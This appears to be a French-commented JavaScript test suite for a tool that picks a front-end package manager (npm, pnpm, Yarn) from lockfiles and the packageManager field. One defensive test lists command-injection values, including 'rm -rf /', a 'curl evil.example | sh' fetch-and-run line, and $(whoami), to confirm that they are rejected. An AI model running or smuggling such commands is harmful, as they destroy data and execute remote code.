// Le choix du gestionnaire de paquets front, et ce qu'il refuse.
//
// railsbox n'installait qu'avec npm : les autres verrous étaient signalés, pas
// exécutés. La note qui l'expliquait pesait le coût d'EMBARQUER trois
// gestionnaires — un argument que Corepack a rendu caduc : il est livré avec
// Node dans l'image d'assets, il ne coûte qu'un shim, et il provisionne la
// version que le projet DÉCLARE.
//
// Le cas qui a forcé la révision : tryzealot/zealot. Son `jsbundling-rails`
// lit lui-même `pnpm-lock.yaml` et `packageManager`, puis exige pnpm — quoi que
// railsbox installe à sa place. Contourner ne servait à rien ; respecter le
// choix du projet était plus simple.
//
// CE QUE CES ÉPREUVES GARDENT, dans l'ordre où elles comptent :
//  1. le comportement npm est INCHANGÉ — c'est la promesse de non-régression ;
//  2. aucune version n'est inventée ;
//  3. rien de tiers n'atteint un shell.
import { test } from "node:test";
import assert from "node:assert/strict";

import {
  DEFAULT_PACKAGE_MANAGER,
  PACKAGE_MANAGERS,
  parsePackageManager,
  planAssets,
  planPackageManager,
  yarnGeneration,
} from "../tools/detect/assets.mjs";
import { SEVERITY } from "../tools/detect/findings.mjs";

const codes = (findings) => findings.map((f) => f.code);
const bloquants = (findings) => findings.filter((f) => f.severity === SEVERITY.BLOCKING);

// --- 1. Le comportement npm ne bouge pas ---------------------------------

test("un package-lock.json installe toujours avec npm ci", () => {
  const plan = planPackageManager({ lockfiles: ["package-lock.json"] });

  assert.equal(plan.manager, "npm");
  assert.equal(plan.install, "npm ci --no-audit --no-fund");
  assert.deepEqual(plan.findings, [], "aucun diagnostic sur le chemin nominal");
});

test("sans aucun verrou, la résolution reste `npm install`", () => {
  const plan = planPackageManager({ lockfiles: [] });

  assert.equal(plan.manager, "npm");
  assert.equal(plan.install, "npm install --no-audit --no-fund");
});

// --- 2. pnpm, et seulement quand le projet le déclare --------------------

test("un verrou pnpm ET un packageManager exact installent avec pnpm", () => {
  const plan = planPackageManager({
    lockfiles: ["pnpm-lock.yaml"],
    packageManager: "pnpm@10.22.0",
  });

  assert.equal(plan.manager, "pnpm");
  assert.equal(plan.install, "pnpm install --frozen-lockfile");
  assert.deepEqual(plan.findings, []);
});

test("un verrou pnpm périmé reste FATAL : --frozen-lockfile n'est pas négociable", () => {
  // La contrepartie de « respecter le gestionnaire du projet » : on installe
  // ce que le verrou décrit, ou on s'arrête. Réécrire le verrou en silence
  // produirait une image dont les dépendances ne sont celles de personne.
  const plan = planPackageManager({
    lockfiles: ["pnpm-lock.yaml"],
    packageManager: "pnpm@10.22.0",
  });

  assert.match(plan.install, /--frozen-lockfile/);
  assert.doesNotMatch(plan.install, /--no-frozen-lockfile|--fix-lockfile/);
});

test("un verrou pnpm SANS packageManager avertit fort et n'invente aucune version", () => {
  const plan = planPackageManager({ lockfiles: ["pnpm-lock.yaml"] });

  assert.equal(plan.manager, DEFAULT_PACKAGE_MANAGER, "on retombe sur npm, comme avant");
  assert.ok(codes(plan.findings).includes("pnpm-sans-package-manager"));
  assert.doesNotMatch(plan.install, /pnpm/, "aucune commande pnpm sans version déclarée");
});

test("un packageManager déclaré pour un gestionnaire non exécuté est signalé", () => {
  // Yarn est sorti de cette liste : ses deux générations sont désormais
  // distinguées par le contenu du verrou. Bun reste refusé.
  for (const nom of ["bun"]) {
    const plan = planPackageManager({ packageManager: `${nom}@1.2.3` });
    assert.equal(plan.manager, "npm", `${nom} ne doit pas être exécuté`);
    assert.ok(codes(plan.findings).includes("package-manager-non-execute"), nom);
  }
});

test("un yarn déclaré SANS verrou installe avec npm, comme pnpm dans le même cas", () => {
  // Sans verrou, il n'y a rien à installer de reproductible : le repli sur
  // `npm install` depuis package.json vaut pour tout le monde. Le silence est
  // celui que pnpm observe déjà dans la même situation.
  const plan = planPackageManager({ packageManager: "yarn@1.22.22" });

  assert.equal(plan.manager, "npm");
  assert.ok(!codes(plan.findings).includes("package-manager-non-execute"));
});

// --- 3. Ce qui est refusé ------------------------------------------------

test("des verrous contradictoires sont refusés, pas arbitrés", () => {
  const plan = planPackageManager({
    lockfiles: ["package-lock.json", "pnpm-lock.yaml"],
    packageManager: "pnpm@10.22.0",
  });

  const durs = bloquants(plan.findings);
  assert.equal(durs.length, 1, "un diagnostic bloquant, pas un choix silencieux");
  assert.equal(durs[0].code, "verrous-front-contradictoires");
  assert.match(durs[0].message, /npm.*pnpm|pnpm.*npm/);
});

test("une valeur hostile de packageManager ne ressort jamais", () => {
  // La forme est validée, pas assainie : ce qui n'est pas exactement
  // `nom@X.Y.Z` est rejeté. Rien de tiers ne peut donc atteindre un shell —
  // et ce qui traverse ensuite est un identifiant d'une liste fermée.
  const hostiles = [
    "pnpm@1.0.0; rm -rf /",
    "pnpm@1.0.0 && curl evil.example | sh",
    "$(whoami)@1.0.0",
    "`id`@1.0.0",
    "pnpm@$(id)",
    "pnpm@1.0.0\nnpm@2.0.0",
    "../../bin/sh@1.0.0",
    "pnpm",
    "",
  ];

  for (const valeur of hostiles) {
    assert.equal(parsePackageManager(valeur), null, `refusé : ${JSON.stringify(valeur)}`);
    const plan = planPackageManager({ lockfiles: ["pnpm-lock.yaml"], packageManager: valeur });
    assert.ok(
      PACKAGE_MANAGERS.includes(plan.manager),
      "le gestionnaire retenu appartient toujours à la liste fermée",
    );
    assert.doesNotMatch(plan.install, /rm -rf|curl|whoami|\$\(|`/);
  }
});

test("parsePackageManager accepte les formes légitimes, empreinte comprise", () => {
  assert.deepEqual(parsePackageManager("pnpm@10.22.0"), { name: "pnpm", version: "10.22.0" });
  assert.deepEqual(parsePackageManager("npm@11.0.0"), { name: "npm", version: "11.0.0" });
  // Corepack accepte une empreinte d'intégrité suffixée : elle est reconnue,
  // et jetée — seul l'identifiant nous sert.
  assert.deepEqual(parsePackageManager("pnpm@9.1.0+sha256.abcdef01"), {
    name: "pnpm",
    version: "9.1.0",
  });
  assert.deepEqual(parsePackageManager("pnpm@10.0.0-rc.1"), {
    name: "pnpm",
    version: "10.0.0-rc.1",
  });
});

// --- 4. Le plan d'assets porte le choix jusqu'au build -------------------

test("planAssets exécute les scripts avec le gestionnaire retenu", () => {
  const pnpm = planAssets({
    assets: { npm: true, scripts: ["build"], packageManager: "pnpm@10.22.0" },
    lockfiles: ["pnpm-lock.yaml"],
  });
  assert.equal(pnpm.plan.manager, "pnpm");
  assert.equal(pnpm.plan.install, "pnpm install --frozen-lockfile");
  assert.deepEqual([...pnpm.plan.scripts], ["build"], "le script de build reste programmé");

  const npm = planAssets({
    assets: { npm: true, scripts: ["build"] },
    lockfiles: ["package-lock.json"],
  });
  assert.equal(npm.plan.manager, "npm");
  assert.equal(npm.plan.install, "npm ci --no-audit --no-fund");
});

test("l'avertissement « verrou npm absent » ne vise plus une installation pnpm", () => {
  // Il disait « la résolution se fera depuis package.json seul » — faux quand
  // pnpm installe depuis son propre verrou. Le laisser aurait fait douter d'une
  // construction pourtant reproductible.
  const { plan, findings } = planAssets({
    assets: { npm: true, packageManager: "pnpm@10.22.0" },
    lockfiles: ["pnpm-lock.yaml"],
  });

  assert.equal(plan.manager, "pnpm");
  assert.ok(!codes(findings).includes("npm-lockfile-absent"));
});

test("sans package.json, aucun gestionnaire n'est imposé", () => {
  const { plan } = planAssets({ assets: { npm: false }, lockfiles: [] });

  assert.equal(plan.install, "");
  assert.equal(plan.manager, DEFAULT_PACKAGE_MANAGER);
});

// --- 4. Yarn : exécuté, mais jamais en confondant ses deux générations ----

/** En-tête réel d'un verrou Yarn Classic. */
const VERROU_CLASSIC =
  "# THIS IS AN AUTOGENERATED FILE. DO NOT EDIT THIS FILE DIRECTLY.\n# yarn lockfile v1\n\n\n";
/** En-tête réel d'un verrou Yarn moderne (Berry). */
const VERROU_BERRY = '__metadata:\n  version: 8\n  cacheKey: 10c0\n\n"lodash@npm:^4":\n';

test("un verrou Yarn Classic installe avec yarn, en mode verrouillé", () => {
  // L'exclusion de yarn était délibérée : Classic et Berry n'ont pas la même
  // option d'installation verrouillée, et les mêler produirait une commande
  // fausse pour l'un des deux. Le verrou le dit lui-même — on le lit.
  const plan = planPackageManager({ lockfiles: ["yarn.lock"], yarnLock: VERROU_CLASSIC });

  assert.equal(plan.manager, "yarn");
  assert.equal(plan.install, "yarn install --frozen-lockfile");
  assert.deepEqual(plan.findings, [], "aucun diagnostic sur le chemin nominal");
});

test("un verrou Yarn moderne DÉCLARÉ installe avec l'option de sa génération", () => {
  const plan = planPackageManager({
    lockfiles: ["yarn.lock"],
    yarnLock: VERROU_BERRY,
    packageManager: "yarn@4.5.0",
  });

  assert.equal(plan.manager, "yarn");
  assert.equal(plan.install, "yarn install --immutable", "Berry ne connaît pas --frozen-lockfile");
});

test("un verrou Yarn moderne SANS `packageManager` retombe sur npm, en le disant", () => {
  // Même règle que pnpm : Corepack ne peut rien provisionner sans version, et
  // sa valeur par défaut est un Yarn 1 — qui refuserait ce verrou.
  const plan = planPackageManager({ lockfiles: ["yarn.lock"], yarnLock: VERROU_BERRY });

  assert.equal(plan.manager, "npm");
  assert.ok(codes(plan.findings).includes("yarn-sans-package-manager"));
  assert.equal(bloquants(plan.findings).length, 0, "un repli n'est pas une erreur bloquante");
});

test("un verrou Yarn illisible retombe sur npm plutôt que de deviner", () => {
  for (const contenu of ["", "des octets qui ne sont pas un verrou", null, undefined]) {
    const plan = planPackageManager({
      lockfiles: ["yarn.lock"],
      yarnLock: /** @type {*} */ (contenu),
    });
    assert.equal(plan.manager, "npm", JSON.stringify(contenu));
    assert.ok(codes(plan.findings).includes("yarn-generation-indeterminee"));
  }
});

test("yarnGeneration reconnaît les deux générations, et rien d'autre", () => {
  assert.equal(yarnGeneration(VERROU_CLASSIC), "classic");
  assert.equal(yarnGeneration(VERROU_BERRY), "berry");
  assert.equal(yarnGeneration("# yarn lockfile v1"), "classic");
  assert.equal(yarnGeneration("n'importe quoi"), null);
  assert.equal(yarnGeneration(/** @type {*} */ (null)), null);
});
